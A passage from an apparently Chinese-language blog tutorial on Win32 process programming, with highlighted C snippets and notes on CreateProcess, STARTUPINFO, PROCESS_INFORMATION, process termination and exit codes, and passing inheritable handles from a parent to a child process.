class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL <span class=\"title function_\">CreateProcess</span><span class=\"params\">(\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   PCTSTR pszApplicationName,\t\t\t\t <span class=\"comment\">// 程序名字\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">   PTSTR pszCommandLine,\t\t\t\t\t<span class=\"comment\">// 命令行参数， char* argv[]</span></span></span><br><span class=\"line\"><span class=\"params\">   PSECURITY_ATTRIBUTES psaProcess,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   PSECURITY_ATTRIBUTES psaThread,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   BOOL bInheritHandles,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   DWORD fdwCreate,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   PVOID pvEnvironment,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   PCTSTR pszCurDir,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   PSTARTUPINFO psiStartInfo,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">   PPROCESS_INFORMATION ppiProcInfo\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">VOID <span class=\"title function_\">TestCreateProcessByCmdline</span><span class=\"params\">()</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\tSTARTUPINFO si = &#123;<span class=\"number\">0</span>&#125;;   \t\t\t\t</span><br><span class=\"line\">    \tPROCESS_INFORMATION pi;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tsi.cb = <span class=\"keyword\">sizeof</span>(si);\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tTCHAR szCmdline[] =TEXT(<span class=\"string\">&quot;c://program files//internet explorer//iexplore.exe http://www.ifeng.com&quot;</span>);\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tBOOL res = CreateProcess(\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\tszCmdline, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\tFALSE, \t\t\t</span><br><span class=\"line\">\t\tCREATE_NEW_CONSOLE, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, &amp;si, &amp;pi); \t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\">VOID <span class=\"title function_\">TestCreateProcess</span><span class=\"params\">()</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\tSTARTUPINFO si = &#123;<span class=\"number\">0</span>&#125;;   \t\t\t\t</span><br><span class=\"line\">    \tPROCESS_INFORMATION pi;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tsi.cb = <span class=\"keyword\">sizeof</span>(si);\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tTCHAR szCmdline[] =TEXT(<span class=\"string\">&quot; http://www.ifeng.com&quot;</span>);\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tBOOL res = CreateProcess(\t\t\t\t</span><br><span class=\"line\">\t\tTEXT(<span class=\"string\">&quot;c://program files//internet explorer//iexplore.exe&quot;</span>), \t\t\t</span><br><span class=\"line\">\t\tszCmdline, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\tFALSE, \t\t\t</span><br><span class=\"line\">\t\tCREATE_NEW_CONSOLE, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, \t\t\t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, &amp;si, &amp;pi); \t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">STARTUPINFO</span>\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span>\t\t\t\t\t</span><br><span class=\"line\">   DWORD cb;\t\t\t\t\t</span><br><span class=\"line\">   PSTR lpReserved;\t\t\t\t\t</span><br><span class=\"line\">   PSTR lpDesktop;\t\t\t\t\t</span><br><span class=\"line\">   PSTR lpTitle;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwX;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwY;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwXSize;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwYSize;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwXCountChars;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwYCountChars;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwFillAttribute;\t\t\t\t\t</span><br><span class=\"line\">   DWORD dwFlags;\t\t\t\t\t</span><br><span class=\"line\">   WORD wShowWindow;\t\t\t\t\t</span><br><span class=\"line\">   WORD cbReserved2;\t\t\t\t\t</span><br><span class=\"line\">   PBYTE lpReserved2;\t\t\t\t\t</span><br><span class=\"line\">   HANDLE hStdInput;\t\t\t\t\t</span><br><span class=\"line\">   HANDLE hStdOutput;\t\t\t\t\t</span><br><span class=\"line\">   HANDLE hStdError;\t\t\t\t\t</span><br><span class=\"line\">&#125; STARTUPINFO, *LPSTARTUPINFO;\t\t\t\t\t</span><br><span class=\"line\">用来设定要创建的应用程序的属性，比如可以指定新创建的控制台程序的标题等待。\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">一般情况，只要为第一个成员赋值就可以了.\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">si.cb = <span class=\"keyword\">sizeof</span>(si); \t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _PROCESS_INFORMATION\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">   HANDLE hProcess;\t\t\t\t//进程句柄\t</span><br><span class=\"line\">   HANDLE hThread;\t\t\t\t//主线程句柄\t</span><br><span class=\"line\">   DWORD dwProcessId;\t\t\t\t//进程ID\t</span><br><span class=\"line\">   DWORD dwThreadId;\t\t\t\t//线程ID\t</span><br><span class=\"line\">&#125; PROCESS_INFORMATION;\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">关于句柄和ID\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">1</span>、都是系统分配的一个编号，句柄是客户程序使用 ID主要是系统调度时使用.\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">2</span>、调用CloseHandle关闭进程或者线程句柄的时候，只是让内核计数器减少一个，并不是终止进程或者线程.\t\t\t\t\t</span><br><span class=\"line\">   进程或线程将继续运行，直到它自己终止运行。\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">3</span>、进程ID与线程ID 是不可能相同。但不要通过进程或者线程的ID来操作进程或者线程，因为，这个编号是会\t\t\t\t\t</span><br><span class=\"line\">   重复使用的，也就是说，当你通过ID=<span class=\"number\">100</span>这个编号去访问一个进程的时候，它已经结束了，而且系统将这个编号\t\t\t\t\t</span><br><span class=\"line\">   赋给了另外一个进程或者线程.\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">终止进程的三种方式：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">1、VOID　ExitProcess(UINT fuExitCode)\t\t\t\t\t\t\t//进程自己调用\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">2、BOOL TerminateProcess(HANDLE hProcess, UINT fuExitCode);\t\t\t\t\t\t\t//终止其他进程\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">3、ExitThread\t\t\t\t\t\t\t//终止进程中的所有线程，进程也会终止\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">获取进程的退出码：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL GetExitCodeProcess(HANDLE hProcess,PDWORD pdwExitCode);\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">   \t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">进程终止时相关操作：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">1、进程中剩余的所有线程全部终止运行\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">2、进程指定的所有用户对象均被释放，所有内核对象均被关闭\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">3、进程内核对象的状态变成收到通知的状态\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">4、进程内核对象的使用计数递减1\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2、句柄的继承\t</span><br><span class=\"line\">只有创建进程的时候是否可以被继承为true，句柄表里也为true才可以被子进程继承</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">进程A中的代码：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">char szBuffer[256] = &#123;0&#125;;\t\t\t\t\t\t\t</span><br><span class=\"line\">char szHandle[8] = &#123;0&#125;;\t\t\t\t\t\t\t</span><br><span class=\"line\">//若要创建能继承的句柄，父进程必须指定一个SECURITY_ATTRIBUTES结构并对它进行初始化\t\t\t\t\t\t\t</span><br><span class=\"line\">//三个成员的意义：大小、默认安全属性、是否可以继承\t\t\t\t\t\t\t</span><br><span class=\"line\">SECURITY_ATTRIBUTES sa;\t\t\t\t\t\t\t</span><br><span class=\"line\">sa.nLength = sizeof(sa);\t\t\t\t\t\t\t</span><br><span class=\"line\">sa.lpSecurityDescriptor = NULL;\t\t\t\t\t\t\t</span><br><span class=\"line\">sa.bInheritHandle = TRUE; \t\t\t\t\t\t\t</span><br><span class=\"line\">//创建一个可以被继承的内核对象\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = CreateEvent(&amp;sa, TRUE, FALSE, NULL);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">//组织命令行参数\t\t\t\t\t\t\t</span><br><span class=\"line\">sprintf(szHandle,&quot;%x&quot;,g_hEvent);\t\t\t\t\t\t\t</span><br><span class=\"line\">sprintf(szBuffer,&quot;C:/z2.exe %s&quot;,szHandle);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">//定义创建进程需要用的结构体\t\t\t\t\t\t\t</span><br><span class=\"line\">STARTUPINFO si = &#123;0&#125;;   \t\t\t\t\t\t\t</span><br><span class=\"line\">PROCESS_INFORMATION pi;\t\t\t\t\t\t\t</span><br><span class=\"line\">si.cb = sizeof(si);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">//创建子进程\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL res = CreateProcess(\t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t</span><br><span class=\"line\">\tszBuffer, \t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t</span><br><span class=\"line\">\tTRUE, \t\t\t\tTRUE的时候，说明子进程可以继承父进程的句柄表\t\t</span><br><span class=\"line\">\tCREATE_NEW_CONSOLE, \t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, &amp;si, &amp;pi); \t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">//设置事件为已通知\t\t\t\t\t\t\t</span><br><span class=\"line\">SetEvent(g_hEvent);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">//关闭句柄 内核对象是否会被销毁？\t\t\t\t\t\t\t</span><br><span class=\"line\">CloseHandle(g_hEvent);  \t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">进程B中的代码：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">char szBuffer[256] = &#123;0&#125;;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">memcpy(szBuffer,argv[1],8);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwHandle = 0;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">sscanf(szBuffer,&quot;%x&quot;,&amp;dwHandle);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,argv[0]);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;%x\\n&quot;,dwHandle);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE g_hEvent = (HANDLE)dwHandle;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;开始等待.....\\n&quot;);\t\t\t\t\t\t\t</span><br><span class=\"line\">//当事件变成已通知时 \t\t\t\t\t\t\t</span><br><span class=\"line\">WaitForSingleObject(g_hEvent, INFINITE);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwCode = GetLastError();\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;等到消息.....%x\\n&quot;,dwCode);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">getchar();\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL CreateProcess(\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpApplicationName,                 // name of executable module\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPTSTR lpCommandLine,                      // command line string\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPSECURITY_ATTRIBUTES lpProcessAttributes, // SD\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // SD\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  BOOL bInheritHandles,                      // handle inheritance option\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  DWORD dwCreationFlags,                     // creation flags\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPVOID lpEnvironment,                      // new environment block\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpCurrentDirectory,                // current directory name\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPSTARTUPINFO lpStartupInfo,               // startup information\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPPROCESS_INFORMATION lpProcessInformation // process information\t\t\t\t\t\t\t\t</span><br><span class=\"line\">);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">实现功能：\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">在A进程中创建一个进程(比如浏览器进程IE)，并设定该子进程的进程内核句柄与主线程内核句柄为可继承\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">在A进程中再创建一个进程B，在B中对IE进程控制\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">进程A代码：\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">char szBuffer[256] = &#123;0&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">char szHandle[8] = &#123;0&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">SECURITY_ATTRIBUTES ie_sa_p;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_sa_p.nLength = sizeof(ie_sa_p);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_sa_p.lpSecurityDescriptor = NULL;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_sa_p.bInheritHandle = TRUE; \t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">SECURITY_ATTRIBUTES ie_sa_t;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_sa_t.nLength = sizeof(ie_sa_t);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_sa_t.lpSecurityDescriptor = NULL;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_sa_t.bInheritHandle = TRUE; \t\t\t\t\t\t\t\t</span><br><span class=\"line\">//创建一个可以被继承的内核对象,此处是个进程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">STARTUPINFO ie_si = &#123;0&#125;;   \t\t\t\t\t\t\t\t</span><br><span class=\"line\">PROCESS_INFORMATION ie_pi;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ie_si.cb = sizeof(ie_si);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">TCHAR szCmdline[] =TEXT(&quot;c://program files//internet explorer//iexplore.exe&quot;);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">CreateProcess(\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tszCmdline, \t\t\t\t\t\t\t</span><br><span class=\"line\">\t&amp;ie_sa_p, \t\t\t\t\t\t\t</span><br><span class=\"line\">\t&amp;ie_sa_t, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tTRUE, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tCREATE_NEW_CONSOLE, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, &amp;ie_si, &amp;ie_pi); \t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">//组织命令行参数\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sprintf(szHandle,&quot;%x %x&quot;,ie_pi.hProcess,ie_pi.hThread);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sprintf(szBuffer,&quot;C:/z2.exe %s&quot;,szHandle);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">//定义创建进程需要用的结构体\t\t\t\t\t\t\t\t</span><br><span class=\"line\">STARTUPINFO si = &#123;0&#125;;   \t\t\t\t\t\t\t\t</span><br><span class=\"line\">PROCESS_INFORMATION pi;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">si.cb = sizeof(si);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">//创建子进程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL res = CreateProcess(\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tszBuffer, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tTRUE, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tCREATE_NEW_CONSOLE, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, \t\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL, &amp;si, &amp;pi); 